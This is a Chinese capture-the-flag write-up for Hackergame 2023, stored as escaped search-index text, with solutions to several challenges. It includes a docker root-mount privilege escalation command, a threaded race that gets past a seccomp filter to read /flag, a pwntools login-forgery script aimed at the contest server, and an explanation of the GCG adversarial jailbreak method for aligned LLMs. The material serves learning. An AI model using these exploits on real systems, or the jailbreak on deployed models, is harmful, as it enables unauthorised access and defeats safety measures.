\u5b66\u4e60\u4e86\u4e00\u4e0b Yaml\uff0c\u6839\u636eYaml 1.1\u4e0e1.2\u7684\u5dee\u5f02\uff0c\u53d1\u73b0Yaml 1.1\u65e0\u6cd5\u89e3\u6790\u5f62\u5982 1e3 \u8fd9\u6837\u7684\u6570\u5b57\uff0c\u4f1a\u5c06\u5176\u89e3\u6790\u4e3a\u5b57\u7b26\u4e32\uff0c\u8fd9\u6837\u7b2c\u4e00\u5c0f\u95ee\u5c31\u89e3\u51b3\u4e86\u3002 \u7b2c\u4e8c\u5c0f\u95ee\u6839\u636e\u641c\u7d22\u5f97\u5230 \u8fd9\u4e2a\u95ee\u9898 \u53ef\u77e5\u9053Yaml\u8981\u6c42\u952e\u503c\u662f\u552f\u4e00\u7684\u5426\u5219\u4f1a\u62a5\u9519\uff0c\u800cJSON\u6ca1\u6709\u8fd9\u4e2a\u8981\u6c42\uff0c\u8fd9\u6837\u5c31\u89e3\u5b8c\u4e86\u3002 Git? Git! \u00b6 \u8fd9\u9898\u975e\u5e38\u7684easy\uff0c\u76f4\u63a5 git reflog \uff0c\u518d git reset \u5c31\u7ed3\u675f\u4e86\u3002 HTTP \u96c6\u90ae\u518c \u00b6 \u5927\u81f4\u5c31\u662f\u4e0d\u65ad\u67e5\u6587\u6863\uff0c\u8fd9\u91cc\u5c31\u76f4\u63a5\u642c\u5b98\u65b9\u9898\u89e3\u4e86 \u5b98\u65b9\u9898\u89e3 200 OK. \u70b9\u51fb\u5c31\u9001\uff0c\u4ee3\u8868\u8bf7\u6c42\u6210\u529f\u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n 404 Not Found. \u4fee\u6539\u8def\u5f84\u5230\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u6587\u4ef6\u5373\u53ef\u3002 GET /x HTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n 400 Bad Request. \u6784\u9020\u4e0d\u7b26\u5408\u683c\u5f0f\u7684 HTTP \u8bf7\u6c42\u5373\u53ef\u3002 GET / aHTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n 505 HTTP Version Not Supported. \u4fee\u6539 HTTP \u7248\u672c\u53f7\u5230\u4e00\u4e2a\u79bb\u8c31\u7684\u503c\u5373\u53ef\u3002 GET / HTTP/11\\r\\n Host: example.com\\r\\n\\r\\n 405 Method Not Allowed. \u4fee\u6539\u8bf7\u6c42\u65b9\u6cd5\u5230 POST \u7b49\u5373\u53ef\u3002 POST / HTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n \u63a5\u4e0b\u6765\u662f\u53ef\u80fd\u9700\u8981\u770b\u6587\u6863\u7684\u90e8\u5206\uff1a 100 Continue. \u4ee3\u8868\u670d\u52a1\u5668\u5e0c\u671b\u5ba2\u6237\u7aef\u7ee7\u7eed\u8bf7\u6c42\u6216\u8005\u5ffd\u7565\u3002\u9700\u8981\u5ba2\u6237\u7aef\u53d1\u9001 Expect: 100-continue \u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Expect: 100-continue\\r\\n\\r\\n 206 Partial Content. \u4e00\u4e2a HTTP \u8bf7\u6c42\u53ef\u4ee5\u53ea\u8bf7\u6c42\u90e8\u5206\u5185\u5bb9\uff0c\u670d\u52a1\u5668\u4e5f\u4f1a\u8fd4\u56de\u90e8\u5206\u5185\u5bb9\u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Range: bytes=1-2\\r\\n\\r\\n 416 Range Not Satisfiable. \u4e0a\u9762\u7684 Range \u662f\u4e00\u4e2a\u5408\u6cd5\u7684\u8303\u56f4\uff0c\u90a3\u4e48\u4e0d\u5408\u6cd5\u7684\u8303\u56f4\u5462\uff1f\u5c31\u662f 416\u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Range: bytes=114514-1919810\\r\\n\\r\\n 304 Not Modified. \u4ee3\u8868\u6587\u4ef6\u5728\u6307\u5b9a\u6761\u4ef6\u4e0b\u6ca1\u6709\u4fee\u6539\u8fc7\uff0c\u8fd9\u91cc\u7528 If-Modified-Since \uff1a GET / HTTP/1.1\\r\\n Host: example.com\\r\\n If-Modified-Since: Tue, 15 Aug 2023 17:03:04 GMT\\r\\n\\r\\n 412 Precondition Failed. \u8fd9\u4e2a payload \u4f7f\u7528\u4e86 ETag + If-Match\uff0cETag \u548c\u5bf9\u5e94\u7684 web \u8d44\u6e90\u5bf9\u5e94\uff0c\u7528\u6765\u533a\u5206\u5bf9\u5e94\u8d44\u6e90\u4e0d\u540c\u7684\u7248\u672c\u3002\u5ba2\u6237\u7aef\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u4fe1\u606f\u6765\u8282\u7701\u5e26\u5bbd\u3002\u8fd9\u91cc If-Match \u5219\u5728\u5c1d\u8bd5\u5339\u914d\u8fd9\u4e2a ETag\uff0c\u5982\u679c\u4e0d\u5339\u914d\uff0c\u90a3\u5c31\u8fd4\u56de 412\u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n If-Match: \"bfc13a64729c4290ef5b2c2730249c88ca92d82d\"\\r\\n\\r\\n 413 Content Too Large. \u4e0d\u9700\u8981\u771f\u6b63\u8f93\u5165\u5f88\u5927\u7684 payload\uff0c\u628a Content-length \u5f04\u5f97\u5f88\u5927\u5c31\u884c\uff1a GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Content-length: 1145141919810\\r\\n\\r\\n 414 URI Too Long. \u5927\u6982\u9700\u8981\u5f88\u957f\u7684 URI \u8def\u5f84\uff08\u4f46\u662f\u53c8\u4e0d\u80fd\u592a\u957f\uff0c\u5426\u5219 web \u754c\u9762\u672c\u4f53\u4e0d\u4f1a\u5141\u8bb8\u8fd9\u6837\u7684\u54cd\u5e94\uff09\u3002\u5185\u5bb9\u8be6\u89c1 414.txt \u3002 \u4ee5\u4e0a\u5c31\u5df2\u7ecf\u96c6\u6ee1\u4e86 12 \u4e2a\u3002\u5728\u9a8c\u9898\u65f6\u8fd8\u6709\u4e00\u4e2a HTTP code \u6f0f\u4e86\uff1a 501 Not Implemented. \u4ee3\u8868\u670d\u52a1\u5668\u4e0d\u652f\u6301\u6b64\u529f\u80fd\u3002Nginx \u6e90\u4ee3\u7801\u4e2d\u9ed8\u8ba4\u914d\u7f6e\u4e0b\u552f\u4e00\u53ef\u80fd\u89e6\u53d1\u7684\u5730\u65b9\u662f https://github.com/nginx/nginx/blob/a13ed7f5ed5bebdc0b9217ffafb75ab69f835a84/src/http/ngx_http_request.c#L2008 : } else { ngx_log_error ( NGX_LOG_INFO , r -> connection -> log , 0 , \"client sent unknown \\\" Transfer-Encoding \\\" : \\\" %V \\\" \" , & r -> headers_in . transfer_encoding -> value ); ngx_http_finalize_request ( r , NGX_HTTP_NOT_IMPLEMENTED ); return NGX_ERROR ; } else \u4e0a\u9762\u53ea\u5141\u8bb8 chunked \uff0c\u6240\u4ee5\u53ef\u4ee5\uff1a GET / HTTP/1.1\\r\\n Transfer-Encoding: gzip\\r\\n Host: example.com\\r\\n\\r\\n gzip \u6362\u6210\u9664\u4e86 chunked \u4ee5\u5916\u7684\u4efb\u610f\u5b57\u7b26\u4e32\u90fd\u884c\u3002 \u6700\u540e\u4e00\u4e2a\u95ee\u9898\uff1a\u6ca1\u6709\u72b6\u6001\u7801\u662f\u600e\u4e48\u56de\u4e8b\uff1f GET /\\r\\n \u8fd9\u91cc\u5b9e\u9645\u53d1\u9001\u7684\u662f HTTP/0.9 \u8bf7\u6c42\uff0c\u5b83\u53ea\u652f\u6301 GET \uff0c\u7136\u540e\u540e\u9762\u76f4\u63a5\u63a5 URL\uff0c\u6ca1\u6709\u522b\u7684\u3002\u7136\u540e\u54cd\u5e94\u5c31\u76f4\u63a5\u54cd\u5e94\u6587\u4ef6\u5185\u5bb9\uff0c\u4e5f\u6ca1\u6709\u72b6\u6001\u7801\u4e4b\u7c7b\u7684\u4e1c\u897f\u3002 Docker for Everyone \u00b6 \u8fd9\u9898\u8003\u70b9\u5c31\u662fdocker\u7528\u6237\u7ec4\u4e0eroot\u5176\u5b9e\u662f\u7b49\u4ef7\u7684\uff0c\u56e0\u6b64\u76f4\u63a5\u542f\u52a8\u4e00\u4e2a\u5bb9\u5668\u628aflag\u6302\u8f7d\u8fdb\u5bb9\u5668\u5373\u53ef\u5728\u5bb9\u5668\u5185\u8bfb\u53d6\u3002\u53e6\u5916\u6ce8\u610f\u4e00\u4e0b\u8f6f\u8fde\u63a5\u7684\u95ee\u9898\u5373\u53ef\u3002 docker run -it --rm -v /:/outside alpine \u60dc\u5b57\u5982\u91d1 2.0 \u00b6 \u76f4\u63a5\u66b4\u529b\u7a77\u4e3e\u5373\u53ef\uff0c\u5176\u5b9e\u6ee1\u8db3\u6761\u4ef6\u7684\u60c5\u51b5\u5f88\u591a\uff0c\u76f4\u63a5\u8fb9\u8dd1\u8fb9\u8f93\u51fa\u5c31\u5f88\u5feb\u80fd\u62ff\u5230flag\u4e86\u3002 \u89e3\u9898\u4ee3\u7801\uff08\u8fc7\u4e8e\u66b4\u529b\uff09 cod_dict = [] cod_dict += [ 'nymeh1niwemflcir}echaet' ] cod_dict += [ 'a3g7}kidgojernoetlsup?h' ] cod_dict += [ 'ulw!f5soadrhwnrsnstnoeq' ] cod_dict += [ 'ct{l-findiehaai{oveatas' ] cod_dict += [ 'ty9kxborszstguyd?!blm-p' ] def get_cod_dict ( c_dict ): return '' . join ( c_dict ) def decrypt_data ( input_codes ): flags = [] for k in range ( 23 ): print ( k ) for j in range ( 23 ): for t in range ( 23 ): for p in range ( 23 ): for f in range ( 23 ): cd_dict = cod_dict . copy () cd_dict [ 0 ] = cod_dict [ 0 ][: k ] + cod_dict [ 0 ][ k ] + cod_dict [ 0 ][ k :] cd_dict [ 1 ] = cod_dict [ 1 ][: j ] + cod_dict [ 1 ][ j ] + cod_dict [ 1 ][ j :] cd_dict [ 2 ] = cod_dict [ 2 ][: t ] + cod_dict [ 2 ][ t ] + cod_dict [ 2 ][ t :] cd_dict [ 3 ] = cod_dict [ 3 ][: p ] + cod_dict [ 3 ][ p ] + cod_dict [ 3 ][ p :] cd_dict [ 4 ] = cod_dict [ 4 ][: f ] + cod_dict [ 4 ][ f ] + cod_dict [ 4 ][ f :] print ( cd_dict ) st_dict = get_cod_dict ( cd_dict ) output_chars = [ st_dict [ c ] for c in input_codes ] if 'flag{' in '' . join ( output_chars ): flags . append ( '' . join ( output_chars )) return flags flags = decrypt_data ([ 53 , 41 , 85 , 109 , 75 , 1 , 33 , 48 , 77 , 90 , 17 , 118 , 36 , 25 , 13 , 89 , 90 , 3 , 63 , 25 , 31 , 77 , 27 , 60 , 3 , 118 , 24 , 62 , 54 , 61 , 25 , 63 , 77 , 36 , 5 , 32 , 60 , 67 , 113 , 28 ]) print ( set ( flags )) \ud83e\ude90 \u9ad8\u9891\u7387\u661f\u7403 \u00b6 \u9898\u76ee\u4e2d\u7ed9\u7684\u662fasciinema\u5f55\u50cf\u6587\u4ef6\uff0c\u76f4\u63a5 asciinema cat \u5373\u53ef\u5f97\u5230\u5b57\u8282\u6d41\uff0c\u4e0d\u8fc7\u4f1a\u6709\u5f88\u591a\u989d\u5916\u4e0d\u9700\u8981\u7684\u4e1c\u897f\uff0c\u5220\u8d77\u6765\u6bd4\u8f83\u9ebb\u70e6\uff0c\u770b\u5230asciinema\u5f55\u5236\u7684\u65f6\u5019\u6709raw\u9009\u9879\uff0c\u4e8e\u662f\u91cd\u65b0\u5f55\u4e86\u4e00\u904d\uff0c\u8fd9\u6837\u5b57\u8282\u6d41\u5c31\u5e72\u51c0\u5f88\u591a\uff0c\u7a0d\u5fae\u6539\u4e00\u4e0b\uff0c\u8fd0\u884c\u5373\u53ef\u3002 \ud83e\ude90 \u5c0f\u578b\u5927\u8bed\u8a00\u6a21\u578b\u661f\u7403 \u00b6 \u5f88\u65b0\u9896\u7684AI\u9898\u76ee\uff0c\u5bf9\u4e8e\u6211\u6765\u8bf4\u53ea\u80fd\u4e71\u8bd5\uff0c\u7b2c\u4e00\u95ee\u76f4\u63a5\u7528repeat\u5927\u6cd5\u5c31\u53ef\u5b8c\u6210\u3002 \u7b2c\u4e8c\u95ee\u5176\u5b9e\u601d\u8def\u5bf9\u7684\uff0c\u4e0d\u8fc7\u6211\u5acc\u9ebb\u70e6\uff0c\u6ca1\u6709\u53bb\u7a77\u4e3ehhh\u3002 \u540e\u9762\u4e24\u95ee\u786e\u5b9e\u53ef\u4ee5\u7684\uff0c\u5b66\u4e60\u4e86\u3002 \u5b98\u65b9\u9898\u89e3 LLM Attacks \u00b6 \u8bba\u6587\uff1a Universal and Transferable Adversarial Attacks on Aligned Language Models Background \u00b6 \u4e00\u4e2a Decoder-Only \u7684 LLM \u5c06\u4e00\u4e32 token \\(x_{1:n}\\) \u6620\u5c04\u5230\u4e0b\u4e00\u4e2a token \\(x_{n+1}\\) \u3002\u8bed\u8a00\u6a21\u578b\u6240\u9700\u8981\u5b66\u4e60\u7684\u5219\u662f\u5728\u7ed9\u5b9a\u4e4b\u524d\u7684 token \\(x_{1:n}\\) \uff0c\u5f97\u5230\u4e0b\u4e00\u4e2a token \\(x_{n+1}\\) \u7684\u6982\u7387 \\(p(x_{n+1} | x_{1:n})\\) \u3002\u5176\u4e2d\u6bcf\u4e00\u4e2a \\(x_i \\in {1, ... V}\\) \u90fd\u662f\u8bcd\u8868\u4e2d\u7684\u4e00\u4e2a token\u3002\u5982\u679c\u60f3\u8981\u8ba9\u6a21\u578b\u8f93\u5165\u4e00\u6bb5\u5e8f\u5217\uff0c\u5e8f\u5217\u4e2d\u6bcf\u4e00\u4e2a token \u90fd\u53ea\u4e0e\u4e4b\u524d\u7684\u6240\u6709 token \u6709\u5173\uff0c\u56e0\u6b64\u6a21\u578b\u8f93\u51fa\u4e00\u6bb5\u5e8f\u5217 \\(x_{n+1:n+H}\\) \u7684\u6982\u7387\u4e3a \\[p(x_{n+1:n+H}|x_{1:n}) = \\prod_{i=1}^H p(x_{n+i} | x_{1:n+i-1})\\] Method \u00b6 \u5982\u679c\u6211\u4eec\u5e0c\u671b\u6a21\u578b\u80fd\u591f\u8f93\u51fa\u4e00\u4e2a\u6307\u5b9a\u7684\u5e8f\u5217\uff0c\u5c31\u662f\u5e0c\u671b \\(p(x_{n+1:n+H}|x_{1:n})\\) \u5c3d\u53ef\u80fd\u9ad8\uff0c\u4ee5\u6b64\u51fa\u53d1\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u4f18\u5316\u76ee\u6807 \\[\\mathcal{L}(x_{1:n}) = -\\log p(x^\\star_{n+1:n+H} | x_{1:n})\\] \u4f46\u662f\u4e0e\u5e38\u89c1\u7684\u56fe\u7247\u4e0a\u9762\u7684\u5bf9\u6297\u6837\u672c\u653b\u51fb\u4e0d\u540c\uff0cLLM \u7684\u8f93\u5165\u662f\u76f8\u5bf9\u79bb\u6563\u7684 token\uff0c\u65e0\u6cd5\u8fdb\u884c\u8fde\u7eed\u7684\u53d8\u5316\u3002\u56e0\u6b64\u4f5c\u8005\u6839\u636e AutoPrompt [1]\uff0c\u8bbe\u8ba1\u4e86 Greedy Coordinate Gradient \u6765\u5c3d\u53ef\u80fd\u9ad8\u6548\u5730\u5bf9\u79bb\u6563\u7684\u8f93\u5165\u8fdb\u884c\u4f18\u5316\u3002 \u901a\u4fd7\u6765\u8bb2\uff0c\u6211\u4eec\u5e0c\u671b\u80fd\u591f\u5c06\u539f\u6709\u8f93\u5165\u7684 Prompt \u4e2d\u7684\u67d0\u4e00\u4e9b token \u66ff\u6362\u4e3a\u65b0\u7684 token\uff0c\u5e76\u4e14\u8ba9\u66ff\u6362\u4e4b\u540e\u5c3d\u53ef\u80fd\u8ba9\u8f93\u51fa\u7684 target loss \u5c3d\u53ef\u80fd\u964d\u4f4e\u3002 \u4f5c\u8005\u7528\u4e00\u4e2a\u957f\u5ea6\u4e3a \\(V\\) \u7684 one hot \u5411\u91cf\u6765\u4ee3\u8868\u5f53\u524d\u4f4d\u7f6e\u7684 token\uff0c\u8be5 one hot \u5411\u91cf\u4e0e embedding layer\uff08\u5927\u5c0f\u4e3a \\(R^{\\mathrm{dim} \\times V}\\) \uff09\u76f8\u4e58\u540e\u53ef\u4ee5\u5f97\u5230\u8be5 token \u5bf9\u5e94\u7684 embedding\uff0c\u8be5 embedding \u88ab\u8f93\u5165\u7ed9\u4e86\u6a21\u578b\u3002\u5728\u53cd\u5411\u4f20\u64ad\u540e\uff0cone hot \u5411\u91cf\u7684\u6bcf\u4e00\u4e2a\u4f4d\u7f6e \\(i\\) \u90fd\u6709\u5bf9\u5e94\u7684\u68af\u5ea6 \\(\\mathrm{grad}_i\\) \uff0c \\(\\mathrm{grad}_i < 0\\) \u8bf4\u660e\u5982\u679c\u5c06\u539f\u672c\u7684 token \u66ff\u6362\u4e3a\u8bcd\u8868\u4e2d\u7684\u7b2c \\(i\\) \u4e2a token\uff0c\u80fd\u591f\u4f7f\u5f97\u8f93\u51fa\u7684 loss \u4e0b\u964d\u3002 \u57fa\u4e8e\u8fd9\u4e2a\u68af\u5ea6\uff0c\u6211\u4eec\u9009\u51fa\u4e86 top-k \u4e2a\u6700\u5c0f\u7684\u66ff\u6362 token\uff08\u7b97\u6cd5\u7684\u7b2c 4 \u884c\uff09\u3002\u7136\u540e\u6211\u4eec\u968f\u673a\u9009\u62e9 prompt \u7684 token \u7684\u4f4d\u7f6e\uff0c\u5c06\u5176\u968f\u673a\u66ff\u6362\u4e3a\u68af\u5ea6\u6700\u5c0f\u7684 k \u4e2a\u4e4b\u4e00\u3002\u91cd\u590d\u4e0a\u8ff0\u66ff\u6362\u591a\u6b21\uff0c\u9009\u62e9\u51fa\u66ff\u6362\u540e loss \u6700\u5c0f\u7684 prompt \u4f5c\u4e3a\u4e0b\u4e00\u6b21\u8fed\u4ee3\u7684\u521d\u59cb\u503c\u3002 [1]: AutoPrompt: Eliciting Knowledge from Language Models with Automatically Generated Prompts. https://arxiv.org/abs/2010.15980 \ud83e\ude90 \u6d41\u5f0f\u661f\u7403 \u00b6 \u9700\u8981\u77e5\u9053\u56fe\u50cf\u7684\u957f\u5bbd\uff0c\u600e\u4e48\u529e\u5462\uff1f\u624b\u52a8plot\u51fa\u6765\u770b\u5457\uff0c\u53cd\u6b63\u8bd5\u4e00\u4e0b\u5f88\u5bb9\u6613\u627e\u5230\u5468\u671f\u6027\u91cd\u590d\u7684\u4e1c\u897f\uff0c\u7136\u540e\u5fae\u8c03\u4e00\u4e0b\u5f97\u5230\u957f\u5bbd\uff0c\u76f4\u63a5\u8f93\u51fa\u89c6\u9891\u5373\u53ef\u3002 Done import cv2 import numpy as np def restore_video ( buffer , output ): frame_width = 427 frame_height = 759 frame_count = 139 video_writer = cv2 . VideoWriter ( output , cv2 . VideoWriter_fourcc ( * \"mp4v\" ), 30.0 , ( frame_width , frame_height )) for i in range ( frame_count ): frame = buffer [ i ] . astype ( np . uint8 ) video_writer . write ( frame ) video_writer . release () if __name__ == \"__main__\" : with open ( \"video.bin\" , \"rb\" ) as input_file : buffer = np . fromfile ( input_file , dtype = np . uint8 ) print ( buffer . shape ) num = [ 2 , 5 , 8 , 11 , 14 , 17 , 20 , 23 , 26 , 29 , 32 , 35 , 38 , 41 , 44 , 47 , 50 , 53 , 56 , 59 , 62 , 65 , 68 , 71 , 74 , 77 , 80 , 83 , 86 , 89 , 92 , 95 , 98 ] nums = [] f = np . append ( buffer , np . zeros ( 93 , dtype = np . uint8 )) f = f . reshape (( - 1 , 759 , 427 , 3 )) restore_video ( f , \"video.mp4\" ) \ud83e\ude90 \u4f4e\u5e26\u5bbd\u661f\u7403 \u00b6 \u8fd9\u4e00\u9898\u7b2c\u4e00\u95ee\u6ca1\u4ec0\u4e48\u95ee\u9898\uff0c\u968f\u4fbf\u538b\u7f29\u4e00\u4e0b\u5c31\u80fd\u8fc7\u3002\u7b2c\u4e8c\u9898\u6709\u70b9\u6298\u78e8\uff0c\u601d\u8def\u662f\u5bf9\u7684\uff0c\u53bb\u627e libvips \u652f\u6301\u7684\u56fe\u50cf\u683c\u5f0f\uff0c\u5c31\u662f\u6211\u592a\u61d2\u4e86\u6ca1\u53bb\u4ed4\u7ec6\u7ffb\uff0c\u4e00\u4e2a\u52b2\u5730\u7422\u78e8SVG\u53bb\u4e86\uff0c\u5bfc\u81f4\u6ca1\u505a\u51fa\u6765\uff0c\u5f88\u53ef\u60dc\u3002\u8fd9\u9053\u9898\u7528JXL\u7684\u683c\u5f0f\u6765\u89e3\u7684\u3002 Komm, s\u00fcsser Flagge \u00b6 \u8fd9\u9053\u9898\u5c31\u662f\u5bf9TCP/IP\u6570\u636e\u5305\u7684\u4fee\u6539\uff0c\u7b2c\u4e00\u95ee\u76f4\u63a5\u4e00\u4e2a\u5b57\u8282\u4e00\u4e2a\u5b57\u8282\u53d1\u9001\u5373\u53ef\u7ed5\u8fc7\uff0c\u7b2c\u4e8c\u95ee\u5176\u5b9e\u975e\u9884\u671f\u4e86\uff0c\u56e0\u4e3a\u4e00\u4e2a\u5b57\u8282\u6ca1\u6709\u5230u32\u7684\u8981\u6c42\uff0c\u76f4\u63a5\u7ed5\u8fc7\u4e86hhh\u3002 \u7b2c\u4e09\u95ee\u601d\u8def\u5176\u5b9e\u5bf9\u4e86\uff0c\u5c31\u662f\u4fee\u6539TCP\u4e2d\u7684OPTION\u90e8\u5206\uff0c\u4e0d\u8fc7\u5f53\u65f6\u5f88\u5fd9\uff0c\u7528python\u5199\u7684\u6709\u70b9\u5947\u602a\uff0c\u6ca1\u7ec6\u8c03\uff0c\u5982\u679c\u7a7a\u95f2\u7684\u8bdd\u5e94\u8be5\u505a\u51fa\u6765\u6ca1\u95ee\u9898\u3002 \u4e3a\u4ec0\u4e48\u8981\u6253\u5f00 /flag \ud83d\ude21 \u00b6 \u7b2c\u4e00\u95ee\u5f88easy\u76f4\u63a5\u9759\u6001\u7f16\u8bd1\u540e\u63d0\u4ea4\u5373\u53ef\u3002\u7b2c\u4e8c\u95ee\u770b\u4e86\u5b98\u65b9\u9898\u89e3\u4e4b\u540e\uff0c\u77e5\u9053\u8981\u591a\u770b\u6ce8\u91ca\uff0c\u7528\u7ebf\u7a0b\u7684\u65b9\u5f0f\u6765\u7ed5\u8fc7seccomp\uff0c\u5b66\u4e60\u4e86\u3002 \u5b98\u65b9\u9898\u89e3 #include <stdio.h> #include <pthread.h> #include <fcntl.h> #include <unistd.h> #include <stdlib.h> #include <time.h> char flagfile [] = \"/flag\" ; void * read_file () { char buf [ 100 ] = {}; while ( 1 ) { int f = open ( flagfile , O_RDONLY ); if ( ! f ) { continue ; } read ( f , buf , 99 ); if ( buf [ 0 ] && buf [ 0 ] != 'I' ) { printf ( \"%s \\n \" , buf ); exit ( 0 ); } close ( f ); } } void * modify () { struct timespec req ; req . tv_sec = 0 ; req . tv_nsec = 50 ; while ( 1 ) { flagfile [ 1 ] = 'a' ; // sleep is not allowed. So just don't sleep. // nanosleep(&req, NULL); flagfile [ 1 ] = 'f' ; } } int main () { printf ( \"pthread \\n \" ); pthread_t t1 , t2 ; pthread_create ( & t1 , NULL , read_file , NULL ); pthread_create ( & t2 , NULL , modify , NULL ); pthread_join ( t1 , NULL ); pthread_join ( t2 , NULL ); printf ( \"done? \\n \" ); return 0 ; } \u5f02\u661f\u6b67\u9014 \u00b6 \u5f88\u597d\u73a9\u7684\u5c0f\u6e38\u620f\uff0c\u5c31\u5f53\u653e\u677e\u4e00\u4e0b\uff0c\u903b\u8f91\u5f88\u7b80\u5355\uff08\u5c0f\u5fc3\u7206\u70b8\uff0c\u7b2c\u4e00\u6b21\u5fd8\u8bb0\u5148\u901a\u51b7\u5374\u6db2\u4e86 \u5fae\u79ef\u5206\u8ba1\u7b97\u5c0f\u7ec3\u4e60 2.0 \u00b6 \u8fd9\u9053\u9898\u5f88\u70e6\uff0c\u5c31\u662f\u611f\u89c9\u81ea\u5df1\u5feb\u505a\u51fa\u6765\u4e86\uff0c\u5c31\u5dee\u4e00\u70b9\u70b9\uff0c\u6240\u4ee5\u9700\u8981\u603b\u7ed3\u4e00\u4e0b\u7ecf\u9a8c\u6559\u8bad\u3002 \u5176\u5b9e\u4e5f\u6ca1\u4ec0\u4e48\u597d\u603b\u7ed3\u7684\uff0c\u5c31\u662f\u6ca1\u6ce8\u610f\u5230 updateElement \uff0c\u5bfc\u81f4\u4e0d\u77e5\u9053\u600e\u4e48\u7ed5\u8fc7\u957f\u5ea6\u9650\u5236\u3002\u4e5f\u662f\u81ea\u5df1\u83dc\uff0c\u5176\u5b9e\u6ca1\u600e\u4e48\u505a\u8fc7XSS\u7684\u9898\u76ee\uff0c\u8fd8\u662f\u9700\u8981\u79ef\u7d2f\u7ecf\u9a8c\uff0c\u611f\u89c9\u597d\u7684XSS\u9898\u76ee\u4e0d\u591a\u3002 \u9006\u5411\u5de5\u7a0b\u4e0d\u9700\u8981 F5 \u00b6 \u8fd9\u9053\u9898\u8bb0\u5f55\u4e00\u4e0b\uff0c\u56e0\u4e3a\u9006\u5411\u7684\u9898\u76ee\u505a\u5f97\u5c11\uff0c\u6240\u4ee5\u9700\u8981\u79ef\u7d2f\u4e00\u4e0b\u3002 \u5b98\u65b9\u9898\u89e3\u4e2d\u9700\u8981\u8bb0\u5f55\u7684\u4e60\u60ef import angr , monkeyhex , claripy proj = angr . Project ( 'no_need_for_F5/main.exe' ) flag_chars = [ claripy . BVS ( 'flag_ %d ' % i , 8 ) for i in range ( 32 )] flag = claripy . Concat ( * [ claripy . BVV ( b 'flag{' )] + flag_chars + [ claripy . BVV ( b '} \\x00 ' )]) state = proj . factory . call_state ( 0x140001000 ) input_addr = 0 @proj . hook ( 0x140001093 , length = 5 ) def get_input ( state ): global input_addr input_addr = state . regs . rdx state . memory . store ( input_addr , flag ) print ( 'Input done' ) @proj . hook ( 0x140001079 , length = 5 ) def printf ( state ): return simgr = proj . factory . simgr ( state ) simgr . explore ( find = 0x1400013A1 , avoid = 0x1400013B7 ) simgr . found [ 0 ] . solver . eval ( flag ) . to_bytes ( 39 , \"big\" ) O(1) \u7528\u6237\u767b\u5f55\u7cfb\u7edf \u00b6 \u6839\u636e\u54c8\u5e0c\u4e66\u7684\u7279\u6027\uff0c\u56e0\u6b64\u6211\u4eec\u53ea\u9700\u8981\u6784\u9020\u4e00\u4e2a\u7528\u6237\uff0c\u4f7f\u5f97\u5b83\u7684SHA1\u503c\u7b49\u4ef7\u4e8e\u5176\u5b50\u8282\u70b9\u5b58\u5728admin\u7528\u6237\u5373\u53ef\u3002\u8fd9\u91cc\u6ce8\u610f\u9700\u8981SHA1\u503c\u80fd\u591f\u88abUTF-8\u89e3\u7801\u5373\u53ef\u3002 \u8fd9\u91cc\u6211\u5148\u627e\u4e86\u5982\u4e0b\u4e24\u4e2a\u7528\u6237\uff1a admin:aaaadcLd admin:aaaaanRH \u8fd9\u91cc\u5176\u5b9e\u53ef\u4ee5\u968f\u4fbf\u641c\u7d22\uff0c\u4e0b\u9762\u90fd\u4ee3\u7801\u6539\u4e00\u4e0b\u90fd\u53ef\u4ee5\u641c\uff0c\u968f\u4fbf\u641c\u3002 \u641c\u7d22\u5408\u9002\u7684admin\u7528\u6237 from itertools import product str1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' prefix = 'admin:' for i in product ( str1 , repeat = 8 ): user = prefix + '' . join ( i ) x = f ( user . encode ()) # x = com(x, x) if b ':' not in x : try : x . decode () print ( user , x ) except : pass \u7136\u540e\u5c31\u7b97\u4e00\u4e0bSHA1\u540e\u62fc\u63a5\u5373\u53ef\uff0c\u89e3\u9898\u811a\u672c\u5982\u4e0b\uff1a \u89e3\u9898\u811a\u672c\uff08\u4fee\u6539\u7248\uff0c\u539f\u7248\u592a\u6742\u4e71\u4e86\uff09 from hashlib import sha1 from pwn import * f = lambda data : sha1 ( data ) def com ( x , y ): if isinstance ( x , bytes ): t = x else : t = x . digest () if isinstance ( y , bytes ): p = y else : p = y . digest () if t > p : t , p = p , t return t + p if __name__ == '__main__' : p = remote ( '202.38.93.111' , 10094 ) token = b '2269:MEUCIFS9KtX84tx7Ri01S4JNBKL/H1pJ2+sHChO3/WlK7QsXAiEA5cTIFBDrdJQfvOANFq0hGHLglZHY31APxc62zvSnKug=' p . recvuntil ( 'token:' ) p . sendline ( token ) p . recvuntil ( 'Choice:' ) p . sendline ( b '1' ) def sendu ( data ): p . recvuntil ( '>' ) p . sendline ( data ) test0 = [ b 'admin:aaaadcLd' , b 'admin:aaaaanRH' ] test1 = b 'a:a' test3 = com ( f ( test0 [ 0 ]), f ( test0 [ 1 ])) sendu ( test1 ) sendu ( test3 ) sendu ( b 'EOF' ) p . recvuntil ( 'Choice:' ) p . sendline ( b '2' ) p . recvuntil ( 'Login credential: ' ) p . sendline ( test0 [ 0 ] . decode () + ':' + f ( test0 [ 1 ]) . hexdigest () + sha1 ( test1 ) . hexdigest ()) p . interactive () \u5176\u4ed6 \u00b6 \u540e\u9762\u7684\u9898\u76ee\u5176\u5b9e\u6ca1\u600e\u4e48\u770b\uff0c\u5c31\u6682\u65f6\u5148\u4e0d\u5199\u4e86\uff0c\u7b49\u4ee5\u540e\u6709\u65f6\u95f4\u7a7a\u4e86\u7814\u7a76\u540e\u518d\u8bb0\u5f55\u4e00\u4e0b\u5427\u3002","title":"Hackergame 2023"},{"location":"writeups/hackergame2023/#hackergame-2023","text":"\u7ea6 3151 \u4e2a\u5b57 222 \u884c\u4ee3\u7801 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 13 \u5206\u949f Abstract 